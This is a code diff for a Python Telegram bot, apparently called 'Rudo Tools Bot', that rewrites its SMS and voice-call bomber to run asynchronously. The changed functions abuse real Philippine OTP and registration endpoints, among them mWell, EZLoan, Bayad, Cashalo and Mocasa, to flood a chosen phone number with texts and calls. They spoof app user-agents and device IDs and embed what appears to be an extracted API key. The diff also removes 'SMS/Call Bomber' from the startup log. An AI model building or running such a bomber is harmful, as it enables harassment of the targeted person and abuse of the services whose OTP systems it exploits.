@@ -13,10 +13,8 @@ from typing import Optional, Dict, Any
 from dataclasses import dataclass, asdict
 from datetime import datetime
 from urllib.parse import quote
-from concurrent.futures import ThreadPoolExecutor
 
 import aiohttp
-import requests
 from telegram import (
     Update,
     InlineKeyboardMarkup,
@@ -594,7 +592,8 @@ def current_timestamp():
 def current_timestamp_ms():
     return int(time.time() * 1000)
 
-def mwell_send(phone):
+# ASYNC SMS BOMBER FUNCTIONS
+async def mwell_send(session, phone):
     try:
         formatted = format_phone(phone)
         timestamp = current_timestamp_ms()
@@ -605,102 +604,102 @@ def mwell_send(phone):
             'x-timestamp': str(timestamp), 'x-request-id': random_string(16)
         }
         body = {'country': 'PH', 'phoneNumber': formatted, 'phoneNumberPrefix': '+63'}
-        r = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def pexx_send(phone):
+async def pexx_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'appversion': '3.0.14', 'x-msession-id': 'undefined', 'tid': random_string(11)}
         body = {'0': {'json': {'email': '', 'areaCode': '+63', 'phone': f'+63{formatted}', 'otpChannel': 'TG', 'otpUsage': 'REGISTRATION'}}}
-        r = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def supportvip_send(phone):
+async def supportvip_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'okhttp/4.11.0', 'Accept-Encoding': 'gzip', 'boat': 'com.peso.loan.vip.credit', 'surface': '1.0.7', 'suggestion': 'd284bf47c4c1e4da4e3e6375498c6245', 'telescope': '', 'Content-Type': 'application/json; charset=utf-8'}
         body = {'invasion': formatted, 'persist': 'login', 'threshold': False}
-        r = requests.post('https://supportviploan.com/pomelo/abortion/suffering/test', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://supportviploan.com/pomelo/abortion/suffering/test', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def ezloan_send(phone):
+async def ezloan_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'okhttp/4.9.2', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'accept-language': 'en', 'imei': random_string(32), 'device': 'android', 'appversion': '2.0.4', 'appid': 'EZLOAN', 'businessid': 'EZLOAN'}
         body = {'businessId': 'EZLOAN', 'contactNumber': f'+63{formatted}'}
-        r = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def xpressph_send(phone):
+async def xpressph_send(session, phone):
     try:
         formatted = format_phone(phone)
         timestamp = current_timestamp()
         headers = {'User-Agent': 'Dalvik/2.1.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
         body = {'FirstName': f'User{timestamp}', 'LastName': 'Test', 'Email': f'user{timestamp}@gmail.com', 'Phone': f'+63{formatted}'}
-        r = requests.post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def bistro_send(phone):
+async def bistro_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36', 'Accept': 'application/json, text/plain, */*', 'x-requested-with': 'com.allcardtech.bistro'}
-        r = requests.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}', headers=headers, timeout=8)
-        return r.status_code == 200
+        async with session.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted}', headers=headers, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def bayadcenter_send(phone):
+async def bayadcenter_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
         body = {'mobileNumber': f'+63{formatted}', 'emailAddress': random_email()}
-        r = requests.post('https://api.online.bayad.com/api/sign-up/otp', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.online.bayad.com/api/sign-up/otp', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def supremeloan_send(phone):
+async def supremeloan_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'okhttp/4.11.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'bill': '', 'syndrome': '1.1.3', 'throughout': 'com.supreme.money.loan', 'cute': 'd284bf47c4c1e4da4e3e6375498c6245', 'cure': '14.864864864864865', 'come': '121.05883328670785', 'Content-Type': 'application/json; charset=utf-8'}
         body = {'aide': 'd284bf47c4c1e4da4e3e6375498c6245', 'exactly': formatted, 'sick': False}
-        r = requests.post('https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://suprememoneyloan.com/berry/oak/puzzle/wipe/blade', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def pickupcoffee_send(phone):
+async def pickupcoffee_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
         body = {'mobile_number': f'+63{formatted}', 'login_method': 'mobile_number'}
-        r = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def honeyloan_send(phone):
+async def honeyloan_send(session, phone):
     try:
         formatted = format_phone(phone)
         headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json', 'Accept': 'application/json'}
         body = {'phone': formatted}
-        r = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def kumuph_send(phone):
+async def kumuph_send(session, phone):
     try:
         formatted = format_phone(phone)
         encrypt_timestamp = current_timestamp()
@@ -710,33 +709,33 @@ def kumuph_send(phone):
         encrypt_signature = hashlib.sha256(sign_data.encode()).hexdigest()
         headers = {'User-Agent': 'okhttp/5.0.0-alpha.14', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'Device-Type': 'android', 'Device-Id': random_string(16)}
         body = {'country_code': '+63', 'encrypt_rnd_string': encrypt_rnd_string, 'cellphone': formatted, 'encrypt_signature': encrypt_signature, 'encrypt_timestamp': encrypt_timestamp}
-        r = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def s5com_send(phone):
+async def s5com_send(session, phone):
     try:
         formatted = f"+63{format_phone(phone)}"
         headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36'}
         body = f'phone_number={formatted}'
-        r = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def cashalo_send(phone):
+async def cashalo_send(session, phone):
     try:
         formatted = format_phone(phone)
         device_identifier = random_string(16)
         headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json', 'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==', 'x-device-identifier': device_identifier, 'x-device-type': '1'}
         body = {'phone_number': formatted, 'device_identifier': device_identifier, 'device_type': 1}
-        r = requests.post('https://api.cashaloapp.com/access/register', headers=headers, json=body, timeout=8)
-        return r.status_code == 200
+        async with session.post('https://api.cashaloapp.com/access/register', headers=headers, json=body, timeout=8) as r:
+            return r.status == 200
     except:
         return False
 
-def mocasa_voice_send(phone):
+async def mocasa_voice_send(session, phone):
     try:
         formatted = format_phone(phone)
         if not formatted.startswith('9'):
@@ -744,11 +743,11 @@ def mocasa_voice_send(phone):
         device_id = "0536db2db2b341e483de881c94e0e203"
         payload = json.dumps({"country": "Philippines", "appVersion": 206, "appPackageName": "com.mocasa.ph", "mobile": formatted, "channel": "APP", "systemType": 0, "myDeviceId": device_id, "appCode": "mocasa", "sendChannel": "voice", "verifyType": 1, "token": ""})
         headers = {'User-Agent': 'okhttp/4.8.0', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
-        r = requests.post('https://service.mocasa.com/app/v1/login/sendVerifyCode', headers=headers, data=payload, timeout=15)
-        if r.status_code == 200:
-            resp = r.json()
-            return resp.get('code') == 0
-        return False
+        async with session.post('https://service.mocasa.com/app/v1/login/sendVerifyCode', headers=headers, data=payload, timeout=15) as r:
+            if r.status == 200:
+                resp = await r.json()
+                return resp.get('code') == 0
+            return False
     except:
         return False
 
@@ -1011,17 +1010,16 @@ async def handle_bomber_deploy(update: Update, context: ContextTypes.DEFAULT_TYP
     
     start_time = time.time()
     
-    loop = asyncio.get_event_loop()
-    with ThreadPoolExecutor(max_workers=30) as executor:
-        futures = []
+    async with aiohttp.ClientSession() as session:
+        tasks = []
         for _ in range(rounds):
             for name, func in SMS_SERVICES:
-                futures.append(loop.run_in_executor(executor, func, phone))
+                tasks.append(func(session, phone))
         for _ in range(calls):
             for name, func in VOICE_SERVICES:
-                futures.append(loop.run_in_executor(executor, func, phone))
+                tasks.append(func(session, phone))
         
-        results = await asyncio.gather(*futures)
+        results = await asyncio.gather(*tasks)
         
     sms_success = 0
     sms_total = 0
@@ -1297,7 +1295,7 @@ def main():
 
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))
 
-    logger.info("Rudo Tools Bot with SMS/Call Bomber started!")
+    logger.info("Rudo Tools Bot started!")
     application.run_polling(stop_signals=None)
 
 if __name__ == "__main__":
